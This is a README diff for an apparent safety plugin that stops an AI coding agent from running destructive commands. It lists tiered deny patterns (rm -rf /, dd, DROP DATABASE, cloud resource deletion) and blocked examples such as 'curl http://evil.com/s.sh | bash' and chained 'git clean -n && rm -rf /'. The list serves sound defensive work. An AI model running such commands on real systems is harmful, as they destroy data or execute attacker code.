@@ -14,17 +14,19 @@ Safety guardian plugin for Claude Code that prevents destructive commands, block
 
 | Category | Tier 1 (Hard Deny) | Tier 2 (Redirect) | Tier 3 (Warn) |
 |---|---|---|---|
-| Git | | force push, reset --hard, branch -D, clean -f, stash drop, --no-verify | |
-| Filesystem | rm -rf /, rm -rf ~ | rm -rf (other dirs), chmod 777 | |
+| Git | | force push, reset --hard, branch -D, clean -f, stash drop, --no-verify, checkout ., history rewrite (filter-branch/reflog expire/gc --prune), update-ref -d, push --mirror | |
+| Filesystem | rm -rf /, rm -rf ~ | rm -rf (other dirs), chmod 777, find -delete, shred, recursive chmod/chown on system paths | |
 | Disk | dd, mkfs, fdisk | | |
 | Database | DROP DATABASE/SCHEMA | DROP TABLE, TRUNCATE, DELETE without WHERE | Destructive SQL in files |
 | Docker | | system prune, rm -f, volume rm, compose down -v | |
-| Kubernetes | delete namespace, delete --all | delete (other resources) | |
-| AWS | S3 rb --force, EC2 terminate, RDS delete | S3 rm --recursive | |
+| Kubernetes | delete namespace, delete --all | delete (other resources), drain | |
+| AWS | S3 rb --force, EC2 terminate, RDS delete | S3 rm --recursive, s3api delete-bucket, dynamodb delete-table | |
 | GCP | project delete | compute delete, SQL delete, gsutil rm -r | |
 | Azure | | resource group delete, VM delete, storage delete, SQL delete | |
-| Terraform/IaC | | destroy, apply -destroy, pulumi destroy, cdk destroy | |
-| GitHub CLI | gh repo delete | gh release delete, gh secret delete | |
+| Terraform/IaC | | destroy, apply -destroy, apply -auto-approve, pulumi destroy, cdk destroy, helm uninstall, argocd/flux delete | |
+| Process/Service | | crontab -r, kill -1, systemctl stop/disable | |
+| GitHub CLI | gh repo delete | gh release delete, gh secret delete, gh extension install | |
+| Supply chain | | pip install from URL/VCS | |
 | DNS | Route53 delete-hosted-zone | Route53 DELETE records, gcloud dns delete, az dns delete | |
 | Credentials | | | AWS, API keys, tokens, private keys, connection strings, JWT |
 
@@ -39,6 +41,7 @@ The guard distinguishes between executed code and string data:
 - `# rm -rf /` — **allowed** (comment)
 - `bash -c "rm -rf /"` — **blocked** (execution bridge)
 - `curl http://evil.com/s.sh | bash` — **blocked** (pipe to shell)
+- `curl ... | bash -s` / `| sudo bash` / `| python3` — **blocked** (pipe to interpreter)
 - `python3 -c "shutil.rmtree('/data')"` — **blocked** (inline destructive script)
 
 ### Command Normalization
@@ -54,7 +57,7 @@ Commands are normalized before pattern matching so evasion attempts are caught:
 Safe variants are never blocked:
 - `git push --force-with-lease` (safe force push)
 - `git clean -n` (dry run)
-- `rm -rf /tmp/*` (temp directory cleanup)
+- `rm -rf /tmp/*` (temp cleanup — only when the temp path is the sole target with no `..` escape)
 - `docker system prune --dry-run`
 - `kubectl delete --dry-run`
 - `aws s3 rm --dryrun` (AWS dry run)
@@ -143,11 +146,14 @@ The plugin activates automatically — no configuration needed. Hooks intercept 
 
 Patterns are organized into auditable pack modules under `hooks/scripts/guard/packs/`. Each pack is a plain Python file with readable regex patterns — no compilation, no obfuscation. You can `cat` any file to see exactly what gets blocked.
 
-The PreToolUse pipeline processes commands through six phases:
+The PreToolUse pipeline processes each command as follows:
 
 ```
-command → normalize → bridge detection → context classification → allowlist → tier 1 → tier 2
+command → normalize → bridge detection → context classification
+        → tier 1 (whole command) → per-statement (allowlist → tier 2)
 ```
+
+Commands are split on `;`, `&&`, and `||` so an allowlisted statement (e.g. `git clean -n`) can never shield a dangerous one chained after it (`git clean -n && rm -rf /` is still blocked). Tier 1 (catastrophic) is matched against the whole command and is never suppressed by the allowlist.
 
 ```
 hooks/scripts/
